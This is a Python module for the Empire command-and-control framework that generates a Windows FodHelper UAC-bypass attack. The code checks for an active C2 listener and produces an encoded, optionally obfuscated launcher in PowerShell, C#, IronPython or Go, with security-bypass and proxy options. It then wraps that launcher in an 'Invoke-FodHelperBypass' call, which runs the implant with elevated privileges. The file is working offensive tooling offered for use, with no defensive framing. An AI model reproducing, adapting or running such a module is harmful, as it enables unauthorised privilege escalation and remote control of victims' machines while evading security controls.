from empire.server.common.empire import MainMenu
from empire.server.core.exceptions import ModuleValidationException
from empire.server.core.module_models import EmpireModule
from empire.server.core.module_service import auto_finalize, auto_get_source


class Module:
    @staticmethod
    @auto_get_source
    @auto_finalize
    def generate(
        main_menu: MainMenu,
        module: EmpireModule,
        params: dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
        script: str = "",
    ):
        command_param = params.get("Command", "")
        listener_name = params.get("Listener", "")
        language = params.get("Language", "powershell")
        obf = params.get("Obfuscate", "False").lower() == "true"
        obf_cmd = params.get("ObfuscateCommand", "")
        bypasses = params.get("Bypasses", "")
        user_agent = params.get("UserAgent", "default")
        proxy = params.get("Proxy", "default")
        proxy_creds = params.get("ProxyCreds", "default")

        if listener_name:
            lang = language.lower()

            if not main_menu.listenersv2.get_active_listener_by_name(listener_name):
                raise ModuleValidationException(
                    f"[!] Invalid listener: {listener_name}"
                )

            if lang == "powershell":
                launcher = main_menu.stagergenv2.generate_launcher(
                    listener_name=listener_name,
                    language="powershell",
                    encode=True,
                    obfuscate=obf,
                    obfuscation_command=obf_cmd,
                    user_agent=user_agent,
                    proxy=proxy,
                    proxy_creds=proxy_creds,
                    bypasses=bypasses,
                )
            elif lang in ("csharp", "ironpython"):
                launcher = main_menu.stagergenv2.generate_exe_oneliner(
                    language=lang,
                    obfuscate=obf,
                    obfuscation_command=obf_cmd,
                    encode=True,
                    listener_name=listener_name,
                )
            elif lang == "go":
                launcher = main_menu.stagergenv2.generate_go_exe_oneliner(
                    language=lang,
                    obfuscate=obf,
                    obfuscation_command=obf_cmd,
                    encode=True,
                    listener_name=listener_name,
                )
            else:
                raise ModuleValidationException(f"Language '{language}' not supported.")

            if not launcher:
                raise ModuleValidationException(
                    "[!] Error in launcher command generation."
                )
        else:
            if not command_param:
                raise ModuleValidationException(
                    "Either Listener or Command must be specified."
                )
            launcher = command_param

        enc_script = launcher.split(" ")[-1]

        script_end = f'Invoke-FodHelperBypass -Command "{enc_script}";`nInvoke-FodHelperBypass completed!'

        return script, script_end
